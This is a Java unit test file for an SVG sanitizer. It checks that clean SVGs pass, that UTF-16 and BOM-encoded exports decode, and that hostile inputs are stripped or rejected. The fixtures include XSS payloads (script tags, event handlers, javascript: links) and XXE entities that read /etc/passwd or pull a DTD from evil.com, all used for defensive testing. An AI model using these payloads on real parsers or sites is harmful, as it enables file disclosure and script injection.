package com.example.svgmanager.service;

import com.example.svgmanager.exception.InvalidSvgException;
import com.example.svgmanager.service.impl.SvgSanitizerServiceImpl;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class SvgSanitizerServiceTest {

    private SvgSanitizerService sanitizerService;

    @BeforeEach
    void setUp() {
        sanitizerService = new SvgSanitizerServiceImpl();
    }

    @Test
    @DisplayName("Should pass and sanitize valid clean SVG")
    void sanitize_ValidSvg() {
        String cleanSvg = "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">" +
                "<circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"green\" stroke-width=\"4\" fill=\"yellow\" />" +
                "</svg>";

        byte[] result = sanitizerService.sanitizeAndValidateSvg(cleanSvg.getBytes(StandardCharsets.UTF_8));
        String resultStr = new String(result, StandardCharsets.UTF_8);

        assertThat(resultStr).contains("<svg");
        assertThat(resultStr).contains("<circle");
        assertThat(resultStr).contains("fill=\"yellow\"");
    }

    @Test
    @DisplayName("Should allow standard SVG with DOCTYPE declaration (W3C / Adobe Illustrator / Inkscape)")
    void sanitize_SvgWithStandardDoctype() {
        String svgWithDoctype = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\" [\n" +
                "    <!ENTITY ns_svg \"http://www.w3.org/2000/svg\">\n" +
                "]>\n" +
                "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                "<path d=\"M10 10 H 90 V 90 H 10 Z\" fill=\"blue\"/>\n" +
                "</svg>";

        byte[] result = sanitizerService.sanitizeAndValidateSvg(svgWithDoctype.getBytes(StandardCharsets.UTF_8));
        String resultStr = new String(result, StandardCharsets.UTF_8);

        assertThat(resultStr).contains("<svg");
        assertThat(resultStr).contains("<path");
        assertThat(resultStr).contains("fill=\"blue\"");
        assertThat(resultStr).doesNotContain("<!DOCTYPE");
    }

    @Test
    @DisplayName("Should strip <script> tag from malicious SVG")
    void sanitize_RemoveScriptTag() {
        String maliciousSvg = "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">" +
                "<script>alert('XSS')</script>" +
                "<rect width=\"50\" height=\"50\" fill=\"blue\"/>" +
                "</svg>";

        byte[] result = sanitizerService.sanitizeAndValidateSvg(maliciousSvg.getBytes(StandardCharsets.UTF_8));
        String resultStr = new String(result, StandardCharsets.UTF_8);

        assertThat(resultStr).doesNotContain("<script");
        assertThat(resultStr).doesNotContain("alert('XSS')");
        assertThat(resultStr).contains("<rect");
    }

    @Test
    @DisplayName("Should strip onload and onclick event handler attributes")
    void sanitize_RemoveEventHandlers() {
        String maliciousSvg = "<svg width=\"100\" height=\"100\" onload=\"alert('XSS')\" xmlns=\"http://www.w3.org/2000/svg\">" +
                "<circle cx=\"50\" cy=\"50\" r=\"40\" onclick=\"evil()\" fill=\"red\"/>" +
                "</svg>";

        byte[] result = sanitizerService.sanitizeAndValidateSvg(maliciousSvg.getBytes(StandardCharsets.UTF_8));
        String resultStr = new String(result, StandardCharsets.UTF_8);

        assertThat(resultStr).doesNotContain("onload");
        assertThat(resultStr).doesNotContain("onclick");
        assertThat(resultStr).doesNotContain("evil()");
        assertThat(resultStr).contains("<circle");
    }

    @Test
    @DisplayName("Should strip javascript: pseudo-protocol in href / src attributes")
    void sanitize_RemoveJavascriptProtocol() {
        String maliciousSvg = "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">" +
                "<a href=\"javascript:alert('pwned')\"><text>Click</text></a>" +
                "</svg>";

        byte[] result = sanitizerService.sanitizeAndValidateSvg(maliciousSvg.getBytes(StandardCharsets.UTF_8));
        String resultStr = new String(result, StandardCharsets.UTF_8);

        assertThat(resultStr).doesNotContain("javascript:alert('pwned')");
        assertThat(resultStr).doesNotContain("href");
        assertThat(resultStr).contains("<text>Click</text>");
    }

    @Test
    @DisplayName("Should strip iframe, object, and embed elements")
    void sanitize_RemoveEmbeddedObjects() {
        String maliciousSvg = "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">" +
                "<iframe src=\"https://malicious.com\"></iframe>" +
                "<object data=\"data:text/html,<script>alert(1)</script>\"></object>" +
                "<embed src=\"evil.swf\"/>" +
                "</svg>";

        byte[] result = sanitizerService.sanitizeAndValidateSvg(maliciousSvg.getBytes(StandardCharsets.UTF_8));
        String resultStr = new String(result, StandardCharsets.UTF_8);

        assertThat(resultStr).doesNotContain("<iframe");
        assertThat(resultStr).doesNotContain("<object");
        assertThat(resultStr).doesNotContain("<embed");
    }

    @Test
    @DisplayName("Should reject XXE entity injection with InvalidSvgException")
    void sanitize_RejectXXE() {
        String xxeSvg = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n" +
                "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                "<text>&xxe;</text>\n" +
                "</svg>";

        assertThatThrownBy(() -> sanitizerService.sanitizeAndValidateSvg(xxeSvg.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(InvalidSvgException.class)
                .hasMessageContaining("XXE protection");
    }

    @Test
    @DisplayName("Should reject XXE parameter entity injection")
    void sanitize_RejectXXEParameterEntity() {
        String xxeSvg = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE svg [\n" +
                "  <!ENTITY % dtd SYSTEM \"http://evil.com/xxe.dtd\">\n" +
                "  %dtd;\n" +
                "]>\n" +
                "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                "<text>test</text>\n" +
                "</svg>";

        assertThatThrownBy(() -> sanitizerService.sanitizeAndValidateSvg(xxeSvg.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(InvalidSvgException.class)
                .hasMessageContaining("XXE protection");
    }

    @Test
    @DisplayName("Should throw InvalidSvgException for empty content or non-SVG content")
    void sanitize_EmptyOrNonSvg() {
        assertThatThrownBy(() -> sanitizerService.sanitizeAndValidateSvg(new byte[0]))
                .isInstanceOf(InvalidSvgException.class);

        assertThatThrownBy(() -> sanitizerService.sanitizeAndValidateSvg("<html><body>Not SVG</body></html>".getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(InvalidSvgException.class);
    }

    // Đầu file kiểu CorelDRAW 2021: khai báo UTF-16 + DOCTYPE + comment, nội dung có tiếng Việt
    private static final String COREL_SVG = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n" +
            "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\r\n" +
            "<!-- Creator: CorelDRAW 2021.5 -->\r\n" +
            "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"1700mm\" height=\"1200mm\">" +
            "<path id=\"Nội thất\" d=\"M10 10 H 90 V 90 H 10 Z\"/></svg>";

    private static byte[] withBom(byte[] bom, byte[] body) {
        byte[] out = new byte[bom.length + body.length];
        System.arraycopy(bom, 0, out, 0, bom.length);
        System.arraycopy(body, 0, out, bom.length, body.length);
        return out;
    }

    private void assertDecodedCorelSvg(byte[] input) {
        String resultStr = new String(sanitizerService.sanitizeAndValidateSvg(input), StandardCharsets.UTF_8);
        assertThat(resultStr).startsWith("<svg");
        assertThat(resultStr).contains("<path");
        assertThat(resultStr).contains("id=\"Nội thất\"");
    }

    @Test
    @DisplayName("Should accept UTF-16LE SVG with BOM (CorelDRAW export) and return UTF-8")
    void sanitize_Utf16LeWithBom() {
        assertDecodedCorelSvg(withBom(new byte[]{(byte) 0xFF, (byte) 0xFE}, COREL_SVG.getBytes(StandardCharsets.UTF_16LE)));
    }

    @Test
    @DisplayName("Should accept UTF-16BE SVG with BOM")
    void sanitize_Utf16BeWithBom() {
        assertDecodedCorelSvg(withBom(new byte[]{(byte) 0xFE, (byte) 0xFF}, COREL_SVG.getBytes(StandardCharsets.UTF_16BE)));
    }

    @Test
    @DisplayName("Should accept UTF-16LE SVG without BOM")
    void sanitize_Utf16LeWithoutBom() {
        assertDecodedCorelSvg(COREL_SVG.getBytes(StandardCharsets.UTF_16LE));
    }

    @Test
    @DisplayName("Should accept UTF-8 SVG with BOM")
    void sanitize_Utf8WithBom() {
        assertDecodedCorelSvg(withBom(new byte[]{(byte) 0xEF, (byte) 0xBB, (byte) 0xBF},
                COREL_SVG.replace("UTF-16", "UTF-8").getBytes(StandardCharsets.UTF_8)));
    }
}
